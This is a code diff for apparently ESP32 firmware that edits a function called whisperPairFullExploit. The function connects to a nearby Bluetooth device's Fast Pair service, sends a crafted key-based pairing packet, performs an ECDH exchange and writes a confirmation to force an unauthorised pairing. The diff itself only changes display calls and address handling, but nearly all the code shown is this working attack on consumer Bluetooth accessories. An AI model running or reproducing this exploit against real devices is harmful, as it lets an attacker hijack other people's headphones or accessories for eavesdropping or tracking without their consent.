@@ -4,20 +4,20 @@
 #include <esp_timer.h>
 
 bool whisperPairFullExploit(NimBLEAddress target) {
-    displayMessage("Starting FULL exploit");
+    displayMessage("Starting FULL exploit", "", "", "", 0);
     
     NimBLEClient* client = NimBLEDevice::createClient();
     if(!client->connect(target)) {
-        displayMessage("Connection failed");
+        displayMessage("Connection failed", "", "", "", 0);
         NimBLEDevice::deleteClient(client);
         return false;
     }
     
-    displayMessage("Connected");
+    displayMessage("Connected", "", "", "", 0);
     
     NimBLERemoteService* service = client->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!service) {
-        displayMessage("Fast Pair service not found");
+        displayMessage("Fast Pair service not found", "", "", "", 0);
         client->disconnect();
         NimBLEDevice::deleteClient(client);
         return false;
@@ -29,22 +29,25 @@ bool whisperPairFullExploit(NimBLEAddress target) {
     if(kbp_char) {
         uint8_t packet[16] = {0x00, 0x11};
         uint8_t target_bytes[6];
-        target.getNative(target_bytes);
+        uint64_t addr = target.getNative();
+        for(int i = 0; i < 6; i++) {
+            target_bytes[5-i] = (addr >> (8*i)) & 0xFF;
+        }
         memcpy(&packet[2], target_bytes, 6);
         esp_fill_random(&packet[8], 8);
         kbp_char->writeValue(packet, 16, false);
     }
     
-    displayMessage("KBP sent, ECDH...");
+    displayMessage("KBP sent, ECDH...", "", "", "", 0);
     
     NimBLERemoteCharacteristic* ecdh_char = service->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
     if(ecdh_char) {
         uint8_t our_public[65];
-        size_t our_len = 0;
+        size_t our_len = 65;
         
         uint64_t start = esp_timer_get_time();
         if(!crypto.generateKeyPair(our_public, &our_len)) {
-            displayMessage("ECDH key gen failed");
+            displayMessage("ECDH key gen failed", "", "", "", 0);
             client->disconnect();
             NimBLEDevice::deleteClient(client);
             return false;
@@ -54,14 +57,14 @@ bool whisperPairFullExploit(NimBLEAddress target) {
         
         std::string peer_public = ecdh_char->readValue();
         if(peer_public.empty()) {
-            displayMessage("No peer public key");
+            displayMessage("No peer public key", "", "", "", 0);
             client->disconnect();
             NimBLEDevice::deleteClient(client);
             return false;
         }
         
         if(!crypto.computeSharedSecret((uint8_t*)peer_public.data(), peer_public.length())) {
-            displayMessage("Shared secret failed");
+            displayMessage("Shared secret failed", "", "", "", 0);
             client->disconnect();
             NimBLEDevice::deleteClient(client);
             return false;
@@ -79,7 +82,7 @@ bool whisperPairFullExploit(NimBLEAddress target) {
         pair_char->writeValue(confirmation, 16, false);
     }
     
-    displayMessage("PAIRING SUCCESSFUL!");
+    displayMessage("PAIRING SUCCESSFUL!", "", "", "", 0);
     
     client->disconnect();
     NimBLEDevice::deleteClient(client);
